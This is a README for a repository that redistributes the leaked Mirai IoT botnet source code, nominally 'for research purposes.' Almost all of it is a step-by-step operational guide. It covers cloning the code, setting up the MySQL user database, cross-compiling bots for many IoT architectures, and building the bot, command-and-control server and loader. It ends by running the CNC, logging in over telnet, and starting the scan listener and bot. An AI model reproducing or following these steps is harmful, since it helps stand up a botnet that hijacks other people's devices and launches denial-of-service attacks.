# Mirai BotNet to Tashiro
<!--

  ,～（（((((((～～､
  (  ＿（（ (((＿　)
  |/　~^^＼)／^^~ヽ|
  |　　＿　《　＿   |
 (|-(_//_)-(_//_)-|）
  |　　 　厶､　　   |     ／￣￣￣￣￣￣￣￣￣￣￣
  ＼   ||||||||　／　　＜  Mirai BotNet to Tashiro.
    ＼_________／       ＼＿＿＿＿＿＿＿＿＿＿＿

-->
Leaked Linux.Mirai Source Code for Research/IoT Development Purposes

Uploaded for research purposes and so we can develop IoT and such.

Modified from https://github.com/jgamblin/Mirai-Source-Code.

## Requirements
* To be able to use vi.
* Do not run in WSL.
* It is recommended that Linux be used as the operating system.

## Credits
[Anna-senpai](https://hackforums.net/showthread.php?tid=5420472)

## Disclaimer
This repository is for academic purposes, the use of this software is your
responsibility.

## Warning
The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/) for this repo is being identified by some AV programs as malware.  Please take caution. 

## Install

※If you are not logged in as root, be sure to add sudo and follow the installation instructions below.<br />
※If you are unable to install the software, please refer to the following URL for installation.

https://programmer.group/mirai-botnet-environment-setup-steps.html

```
# apt-get install git gcc golang electric-fence mysql-server mysql-client
# git clone https://github.com/ware255/Mirai-Source-Code-plus.git
# cd Mirai-Source-Code-plus/scripts
# service mysql start
```
Add users to mysql.
```
# cat db.sql | mysql -uroot -proot
# mysql -uroot -proot
> INSERT INTO users VALUES (NULL, 'mirai-user', 'mirai-pass', 0, 0, 0, 0, -1, 1, 30, '');
> exit
# service mysql restart
```
Cross Compile
```
# chmod +x cross-compile.sh
# sudo ./cross-compile.sh
```
Enter "n" here.
```
Install mysql-server and mysql-client (y/n)? n
```
Edit .bashrc
```
# vi ~/.bashrc
```
Add the following string to the last line
```
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/powerpc-440fp/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export GOPATH=$HOME/go
```
After adding and saving, enter the following command
```
# mkdir ~/go
# source ~/.bashrc
```
Build bot and CNC
Get golang requiremnts
```
# go get github.com/go-sql-driver/mysql
# go get github.com/mattn/go-shellwords
```
In mirai folder, run build.sh script
```
# cd ../mirai
# chmod +x build.sh
# ./build.sh debug telnet
# ./build.sh release telnet
# cp ../prompt.txt debug
# cp ../prompt.txt release
# cd /release
```
Build loader
```
# cd ../loader
# chmod +x build.sh
# ./build.sh
```
This completes the installation. :)

## How to use
※If you are not logged in as root, be sure to add sudo and follow these steps.

https://programmer.group/mirai-botnet-environment-setup-steps.html

```
# ./debug/cnc
```
Open a new winsow.
```
# telnet cnc.change.com 23
```
username & password
```
username: mirai-user
password: mirai-user
```
Open a new winsow.
```
# cd mirai/debug
# ./scanListen
```
Open a new winsow.
```
# ./mirai.dbg
```
